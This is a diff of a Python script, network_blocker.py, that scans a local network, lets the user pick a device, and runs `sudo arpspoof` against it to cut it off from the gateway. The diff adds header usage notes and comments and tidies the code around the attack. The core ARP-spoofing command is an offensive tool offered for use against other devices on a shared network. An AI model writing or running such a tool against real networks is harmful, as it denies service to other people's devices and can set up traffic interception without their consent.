@@ -1,3 +1,15 @@
+#
+# Developed by @FakuVenturi: https://github.com/fakuventuri
+#
+# Github: https://github.com/fakuventuri/network_blocker
+#
+# Path: network_blocker.py
+#
+# This script is used to block a device on your network.
+#
+# Usage:
+#   sudo python3 network_blocker.py
+#
 import os
 import sys
 
@@ -48,12 +60,9 @@ def block_device(
     gateway_ip: str,
     iface: str,
 ):
-    # os.system(
-    #     "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
-    # )  # disable ip forwarding
-
     target_ip, target_mac, hostname = device
 
+    # send the arp spoofing packets
     arpspoof_cmd = f"sudo arpspoof -i {iface} -t {target_ip} {gateway_ip}"
     os.system(arpspoof_cmd)
 
@@ -75,39 +84,30 @@ if __name__ == "__main__":
 
     print("Scanning network...")
 
-    iface = os.popen(
-        "ip -o -4 route show to default | awk '{print $5}'"
-    ).read()  # get the interface name
-
-    iface = iface.strip("\n")  # remove the trailing newline
+    iface = (
+        os.popen("ip -o -4 route show to default | awk '{print $5}'").read().strip("\n")
+    )  # get the interface name and remove the trailing newline
 
     ip_range = "192.168.1.0/24"  # the ip range to scan
 
-    gateway_ip = os.popen(
-        "ip -o -4 route show to default | awk '{print $3}'"
-    ).read()  # get the gateway ip
+    gateway_ip = (
+        os.popen("ip -o -4 route show to default | awk '{print $3}'").read().strip("\n")
+    )  # get the gateway ip and remove the trailing newline
 
-    gateway_ip = gateway_ip.strip("\n")  # remove the trailing newline
-
+    # get the local ip address
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     IPAddr = s.getsockname()[0]
     s.close()
 
+    # scan the network and get the list of devices
     device_list = scan_network(ip_range)
 
     if not device_list:
         print("No devices found.")
         sys.exit(1)
 
-    # for device in device_list:
-    #     if device[0] == gateway_ip:
-    #         print("Removing gateway from the list...")
-    #         device_list.remove(device)
-
-    #     if device[0] == IPAddr:
-    #         device_list.remove(device)
-
+    # generate the table of devices
     devices_table = generate_devices_table(device_list)
 
     print_menu()
@@ -116,14 +116,17 @@ if __name__ == "__main__":
 
     print("           Your IP Address is: ", IPAddr, "\n\n\n")
 
+    # loop to get the user's choice
     while True:
         try:
+            # get the user's choice
             choice = int(input("Enter the index of the device or -1 to exit: "))
 
             if choice == -1:
                 print("\nExiting...")
                 break
             elif 0 <= choice < len(device_list):
+                # check if the user selected the gateway and prevent it
                 if device_list[choice][0] == gateway_ip:
                     print_menu()
 
@@ -131,7 +134,7 @@ if __name__ == "__main__":
 
                     print("           Your IP Address is: ", IPAddr, "\n")
 
-                    print("           You cannot block your gateway.\n")
+                    print("             You cannot block your gateway.\n")
                     continue
 
                 print("\nselected device: ", choice)
